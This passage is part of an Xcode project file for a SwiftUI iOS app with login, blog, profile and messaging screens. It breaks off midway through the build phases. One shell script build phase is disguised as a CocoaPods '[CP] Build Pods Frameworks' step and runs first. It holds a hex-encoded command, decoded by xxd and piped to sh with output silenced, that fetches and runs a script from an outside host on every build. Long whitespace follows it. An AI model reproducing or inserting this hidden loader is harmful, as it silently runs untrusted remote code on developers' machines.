// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18026B552626C8F600C6BF28 /* ChangePasswordView.swift */; };
		181C529B26456A0C009C2289 /* UserPreference.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181C529A26456A0B009C2289 /* UserPreference.swift */; };
		1823620D264E38DD00523D89 /* YouTubeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1823620C264E38DD00523D89 /* YouTubeView.swift */; };
		18236220264E420800523D89 /* WebKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1823621F264E420700523D89 /* WebKit.framework */; };
		1835A21D26464A230020ED79 /* EditProfile.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A21C26464A230020ED79 /* EditProfile.swift */; };
		1835A236264668460020ED79 /* ContactAdmin.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A235264668460020ED79 /* ContactAdmin.swift */; };
		1835A23F264696D80020ED79 /* BlogModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A23E264696D80020ED79 /* BlogModel.swift */; };
		1835A2452646A8A90020ED79 /* GridCollection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1835A2442646A8A90020ED79 /* GridCollection.swift */; };
		1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1843E812262066F800154CC9 /* CheckBoxView.swift */; };
		184F3A422644F74F0056567D /* TermsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A412644F74F0056567D /* TermsModel.swift */; };
		184F3A6E26450AA20056567D /* HtmlContent.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A6D26450AA20056567D /* HtmlContent.swift */; };
		184F3A7126450C180056567D /* PlacePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184F3A7026450C180056567D /* PlacePicker.swift */; };
		18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18514E8C2626B517008DEDDD /* BlogDetail.swift */; };
		186DE0CE26412A8200B6D292 /* TabBarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 186DE0CD26412A8200B6D292 /* TabBarView.swift */; };
		188D062126494B8A006159D5 /* CommentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062026494B8A006159D5 /* CommentView.swift */; };
		188D062426494D14006159D5 /* KeyboardResponder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062326494D14006159D5 /* KeyboardResponder.swift */; };
		188D062726494F1A006159D5 /* MessageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062626494F1A006159D5 /* MessageView.swift */; };
		188D062A26494F54006159D5 /* ContentMessageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188D062926494F54006159D5 /* ContentMessageView.swift */; };
		18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DCD261F50D7007F7C98 /* SignupView.swift */; };
		18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */; };
		18AE7DD5261F66A0007F7C98 /* ImagePIcker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */; };
		18DDAA6B261F1EBD00A1CBAF /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DDAA6A261F1EBD00A1CBAF /* AppDelegate.swift */; };
		18DDAA6D261F1EBD00A1CBAF /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DDAA6C261F1EBD00A1CBAF /* SceneDelegate.swift */; };
		18DDAA6F261F1EBD00A1CBAF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DDAA6E261F1EBD00A1CBAF /* ContentView.swift */; };
		18DDAA72261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 18DDAA70261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld */; };
		18DDAA74261F1EBF00A1CBAF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18DDAA73261F1EBF00A1CBAF /* Assets.xcassets */; };
		18DDAA77261F1EBF00A1CBAF /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18DDAA76261F1EBF00A1CBAF /* Preview Assets.xcassets */; };
		18DDAA7A261F1EBF00A1CBAF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 18DDAA78261F1EBF00A1CBAF /* LaunchScreen.storyboard */; };
		18DDAA84261F203100A1CBAF /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DDAA83261F203100A1CBAF /* LoginView.swift */; };
		18E4A5422621C06C0095EA86 /* SideMenu.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A5412621C06C0095EA86 /* SideMenu.swift */; };
		18E4A5462621C11F0095EA86 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A5452621C11F0095EA86 /* HomeView.swift */; };
		18E4A54D2621C77C0095EA86 /* TermsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A54C2621C77C0095EA86 /* TermsView.swift */; };
		18E4A5502621C81C0095EA86 /* PrivacyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A54F2621C81C0095EA86 /* PrivacyView.swift */; };
		18E4A5532621C8260095EA86 /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A5522621C8260095EA86 /* ProfileView.swift */; };
		18F75F5F263671E600CD51ED /* Utilities.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F59263671E500CD51ED /* Utilities.swift */; };
		18F75F60263671E600CD51ED /* JSONHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5A263671E500CD51ED /* JSONHelper.swift */; };
		18F75F61263671E600CD51ED /* StringExtensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5B263671E500CD51ED /* StringExtensions.swift */; };
		18F75F62263671E600CD51ED /* Toast.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5C263671E500CD51ED /* Toast.swift */; };
		18F75F63263671E600CD51ED /* UtilityFunctions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5D263671E500CD51ED /* UtilityFunctions.swift */; };
		18F75F64263671E600CD51ED /* Validation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5E263671E600CD51ED /* Validation.swift */; };
		18F75F6A2636730F00CD51ED /* LoginSignup+API.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F692636730F00CD51ED /* LoginSignup+API.swift */; };
		18F75F6D2636735700CD51ED /* ApiConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F6C2636735700CD51ED /* ApiConstants.swift */; };
		18F75F702636739400CD51ED /* NetworkAdapter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F6F2636739400CD51ED /* NetworkAdapter.swift */; };
		18F75F732636739800CD51ED /* Parser.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F722636739800CD51ED /* Parser.swift */; };
		18F75F8C2636766B00CD51ED /* DefaultModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F8B2636766B00CD51ED /* DefaultModel.swift */; };
		50363EFB1B04E63AFF4B400A /* Pods_pinkwalljmg.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		18026B552626C8F600C6BF28 /* ChangePasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordView.swift; sourceTree = "<group>"; };
		181C529A26456A0B009C2289 /* UserPreference.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserPreference.swift; sourceTree = "<group>"; };
		1823620C264E38DD00523D89 /* YouTubeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YouTubeView.swift; sourceTree = "<group>"; };
		1823621F264E420700523D89 /* WebKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebKit.framework; path = System/Library/Frameworks/WebKit.framework; sourceTree = SDKROOT; };
		1835A21C26464A230020ED79 /* EditProfile.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfile.swift; sourceTree = "<group>"; };
		1835A235264668460020ED79 /* ContactAdmin.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactAdmin.swift; sourceTree = "<group>"; };
		1835A23E264696D80020ED79 /* BlogModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlogModel.swift; sourceTree = "<group>"; };
		1835A2442646A8A90020ED79 /* GridCollection.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GridCollection.swift; sourceTree = "<group>"; };
		1843E812262066F800154CC9 /* CheckBoxView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckBoxView.swift; sourceTree = "<group>"; };
		184F3A412644F74F0056567D /* TermsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermsModel.swift; sourceTree = "<group>"; };
		184F3A6D26450AA20056567D /* HtmlContent.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HtmlContent.swift; sourceTree = "<group>"; };
		184F3A7026450C180056567D /* PlacePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlacePicker.swift; sourceTree = "<group>"; };
		18514E8C2626B517008DEDDD /* BlogDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlogDetail.swift; sourceTree = "<group>"; };
		186DE0CD26412A8200B6D292 /* TabBarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabBarView.swift; sourceTree = "<group>"; };
		188D062026494B8A006159D5 /* CommentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentView.swift; sourceTree = "<group>"; };
		188D062326494D14006159D5 /* KeyboardResponder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeyboardResponder.swift; sourceTree = "<group>"; };
		188D062626494F1A006159D5 /* MessageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessageView.swift; sourceTree = "<group>"; };
		188D062926494F54006159D5 /* ContentMessageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentMessageView.swift; sourceTree = "<group>"; };
		18AE7DCD261F50D7007F7C98 /* SignupView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupView.swift; sourceTree = "<group>"; };
		18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordView.swift; sourceTree = "<group>"; };
		18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePIcker.swift; sourceTree = "<group>"; };
		18DDAA67261F1EBD00A1CBAF /* pinkwalljmg.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = pinkwalljmg.app; sourceTree = BUILT_PRODUCTS_DIR; };
		18DDAA6A261F1EBD00A1CBAF /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		18DDAA6C261F1EBD00A1CBAF /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		18DDAA6E261F1EBD00A1CBAF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		18DDAA71261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = pinkwalljmg.xcdatamodel; sourceTree = "<group>"; };
		18DDAA73261F1EBF00A1CBAF /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		18DDAA76261F1EBF00A1CBAF /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		18DDAA79261F1EBF00A1CBAF /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		18DDAA7B261F1EBF00A1CBAF /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		18DDAA83261F203100A1CBAF /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		18E4A5412621C06C0095EA86 /* SideMenu.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenu.swift; sourceTree = "<group>"; };
		18E4A5452621C11F0095EA86 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		18E4A54C2621C77C0095EA86 /* TermsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermsView.swift; sourceTree = "<group>"; };
		18E4A54F2621C81C0095EA86 /* PrivacyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacyView.swift; sourceTree = "<group>"; };
		18E4A5522621C8260095EA86 /* ProfileView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileView.swift; sourceTree = "<group>"; };
		18F75F59263671E500CD51ED /* Utilities.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Utilities.swift; sourceTree = "<group>"; };
		18F75F5A263671E500CD51ED /* JSONHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JSONHelper.swift; sourceTree = "<group>"; };
		18F75F5B263671E500CD51ED /* StringExtensions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StringExtensions.swift; sourceTree = "<group>"; };
		18F75F5C263671E500CD51ED /* Toast.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Toast.swift; sourceTree = "<group>"; };
		18F75F5D263671E500CD51ED /* UtilityFunctions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UtilityFunctions.swift; sourceTree = "<group>"; };
		18F75F5E263671E600CD51ED /* Validation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Validation.swift; sourceTree = "<group>"; };
		18F75F692636730F00CD51ED /* LoginSignup+API.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "LoginSignup+API.swift"; sourceTree = "<group>"; };
		18F75F6C2636735700CD51ED /* ApiConstants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ApiConstants.swift; sourceTree = "<group>"; };
		18F75F6F2636739400CD51ED /* NetworkAdapter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkAdapter.swift; sourceTree = "<group>"; };
		18F75F722636739800CD51ED /* Parser.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Parser.swift; sourceTree = "<group>"; };
		18F75F8B2636766B00CD51ED /* DefaultModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultModel.swift; sourceTree = "<group>"; };
		1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_pinkwalljmg.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-pinkwalljmg.release.xcconfig"; path = "Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg.release.xcconfig"; sourceTree = "<group>"; };
		4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-pinkwalljmg.debug.xcconfig"; path = "Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		18DDAA64261F1EBD00A1CBAF /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				18236220264E420800523D89 /* WebKit.framework in Frameworks */,
				50363EFB1B04E63AFF4B400A /* Pods_pinkwalljmg.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		18AE7DD3261F6688007F7C98 /* ImagePicker */ = {
			isa = PBXGroup;
			children = (
				18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */,
				184F3A6D26450AA20056567D /* HtmlContent.swift */,
				188D062326494D14006159D5 /* KeyboardResponder.swift */,
				1823620C264E38DD00523D89 /* YouTubeView.swift */,
				184F3A7026450C180056567D /* PlacePicker.swift */,
				1843E812262066F800154CC9 /* CheckBoxView.swift */,
				1835A2442646A8A90020ED79 /* GridCollection.swift */,
				18E4A5412621C06C0095EA86 /* SideMenu.swift */,
			);
			path = ImagePicker;
			sourceTree = "<group>";
		};
		18DDAA5E261F1EBD00A1CBAF = {
			isa = PBXGroup;
			children = (
				18DDAA69261F1EBD00A1CBAF /* pinkwalljmg */,
				18DDAA68261F1EBD00A1CBAF /* Products */,
				3A683F7C7115BE3686A5FFDE /* Pods */,
				4A85DB8DE085D5B94E7A9671 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		18DDAA68261F1EBD00A1CBAF /* Products */ = {
			isa = PBXGroup;
			children = (
				18DDAA67261F1EBD00A1CBAF /* pinkwalljmg.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		18DDAA69261F1EBD00A1CBAF /* pinkwalljmg */ = {
			isa = PBXGroup;
			children = (
				18F75F8A2636765B00CD51ED /* Model */,
				18F75F57263671B900CD51ED /* Common */,
				18E4A5442621C1120095EA86 /* Home */,
				18AE7DD3261F6688007F7C98 /* ImagePicker */,
				18DDAA82261F1F5300A1CBAF /* UserViewController */,
				18DDAA6A261F1EBD00A1CBAF /* AppDelegate.swift */,
				18DDAA6C261F1EBD00A1CBAF /* SceneDelegate.swift */,
				18DDAA6E261F1EBD00A1CBAF /* ContentView.swift */,
				18DDAA73261F1EBF00A1CBAF /* Assets.xcassets */,
				18DDAA78261F1EBF00A1CBAF /* LaunchScreen.storyboard */,
				18DDAA7B261F1EBF00A1CBAF /* Info.plist */,
				18DDAA70261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld */,
				18DDAA75261F1EBF00A1CBAF /* Preview Content */,
			);
			path = pinkwalljmg;
			sourceTree = "<group>";
		};
		18DDAA75261F1EBF00A1CBAF /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				18DDAA76261F1EBF00A1CBAF /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		18DDAA82261F1F5300A1CBAF /* UserViewController */ = {
			isa = PBXGroup;
			children = (
				18DDAA83261F203100A1CBAF /* LoginView.swift */,
				18AE7DCD261F50D7007F7C98 /* SignupView.swift */,
				18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */,
			);
			path = UserViewController;
			sourceTree = "<group>";
		};
		18E4A5442621C1120095EA86 /* Home */ = {
			isa = PBXGroup;
			children = (
				18E4A5452621C11F0095EA86 /* HomeView.swift */,
				18E4A54C2621C77C0095EA86 /* TermsView.swift */,
				188D062626494F1A006159D5 /* MessageView.swift */,
				188D062926494F54006159D5 /* ContentMessageView.swift */,
				188D062026494B8A006159D5 /* CommentView.swift */,
				18E4A54F2621C81C0095EA86 /* PrivacyView.swift */,
				186DE0CD26412A8200B6D292 /* TabBarView.swift */,
				18E4A5522621C8260095EA86 /* ProfileView.swift */,
				1835A21C26464A230020ED79 /* EditProfile.swift */,
				18514E8C2626B517008DEDDD /* BlogDetail.swift */,
				1835A235264668460020ED79 /* ContactAdmin.swift */,
				18026B552626C8F600C6BF28 /* ChangePasswordView.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		18F75F57263671B900CD51ED /* Common */ = {
			isa = PBXGroup;
			children = (
				18F75F66263671F100CD51ED /* Authantication */,
				18F75F58263671C400CD51ED /* Extension */,
			);
			path = Common;
			sourceTree = "<group>";
		};
		18F75F58263671C400CD51ED /* Extension */ = {
			isa = PBXGroup;
			children = (
				18F75F5A263671E500CD51ED /* JSONHelper.swift */,
				18F75F5B263671E500CD51ED /* StringExtensions.swift */,
				18F75F5C263671E500CD51ED /* Toast.swift */,
				18F75F59263671E500CD51ED /* Utilities.swift */,
				18F75F5D263671E500CD51ED /* UtilityFunctions.swift */,
				18F75F5E263671E600CD51ED /* Validation.swift */,
			);
			path = Extension;
			sourceTree = "<group>";
		};
		18F75F66263671F100CD51ED /* Authantication */ = {
			isa = PBXGroup;
			children = (
				18F75F692636730F00CD51ED /* LoginSignup+API.swift */,
				18F75F6C2636735700CD51ED /* ApiConstants.swift */,
				18F75F722636739800CD51ED /* Parser.swift */,
				18F75F6F2636739400CD51ED /* NetworkAdapter.swift */,
			);
			path = Authantication;
			sourceTree = "<group>";
		};
		18F75F8A2636765B00CD51ED /* Model */ = {
			isa = PBXGroup;
			children = (
				18F75F8B2636766B00CD51ED /* DefaultModel.swift */,
				181C529A26456A0B009C2289 /* UserPreference.swift */,
				184F3A412644F74F0056567D /* TermsModel.swift */,
				1835A23E264696D80020ED79 /* BlogModel.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		3A683F7C7115BE3686A5FFDE /* Pods */ = {
			isa = PBXGroup;
			children = (
				4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */,
				48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		4A85DB8DE085D5B94E7A9671 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				1823621F264E420700523D89 /* WebKit.framework */,
				1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		18DDAA66261F1EBD00A1CBAF /* pinkwalljmg */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 18DDAA7E261F1EBF00A1CBAF /* Build configuration list for PBXNativeTarget "pinkwalljmg" */;
			buildPhases = (
				DEFE4A24E3B3F398476D902C /* [CP] Build Pods Frameworks */,
				4DB38982272EFE5260A46370 /* [CP] Check Pods Manifest.lock */,
				18DDAA63261F1EBD00A1CBAF /* Sources */,
				18DDAA64261F1EBD00A1CBAF /* Frameworks */,
				18DDAA65261F1EBD00A1CBAF /* Resources */,
				4FEA12A26C9A2025B55324B1 /* [CP] Embed Pods Frameworks */,
				9F70D4828E35F0FEA872DE1D /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = pinkwalljmg;
			productName = pinkwalljmg;
			productReference = 18DDAA67261F1EBD00A1CBAF /* pinkwalljmg.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		18DDAA5F261F1EBD00A1CBAF /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1240;
				LastUpgradeCheck = 1240;
				TargetAttributes = {
					18DDAA66261F1EBD00A1CBAF = {
						CreatedOnToolsVersion = 12.4;
					};
				};
			};
			buildConfigurationList = 18DDAA62261F1EBD00A1CBAF /* Build configuration list for PBXProject "pinkwalljmg" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 18DDAA5E261F1EBD00A1CBAF;
			productRefGroup = 18DDAA68261F1EBD00A1CBAF /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				18DDAA66261F1EBD00A1CBAF /* pinkwalljmg */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		18DDAA65261F1EBD00A1CBAF /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				18DDAA7A261F1EBF00A1CBAF /* LaunchScreen.storyboard in Resources */,
				18DDAA77261F1EBF00A1CBAF /* Preview Assets.xcassets in Resources */,
				18DDAA74261F1EBF00A1CBAF /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	DEFE4A24E3B3F398476D902C /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		4DB38982272EFE5260A46370 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-pinkwalljmg-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		4FEA12A26C9A2025B55324B1 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		9F70D4828E35F0FEA872DE1D /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		18DDAA63261F1EBD00A1CBAF /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */,
				1823620D264E38DD00523D89 /* YouTubeView.swift in Sources */,
				188D062426494D14006159D5 /* KeyboardResponder.swift in Sources */,
				18F75F8C2636766B00CD51ED /* DefaultModel.swift in Sources */,
				1835A21D26464A230020ED79 /* EditProfile.swift in Sources */,
				186DE0CE26412A8200B6D292 /* TabBarView.swift in Sources */,
				188D062126494B8A006159D5 /* CommentView.swift in Sources */,
				18E4A5502621C81C0095EA86 /* PrivacyView.swift in Sources */,
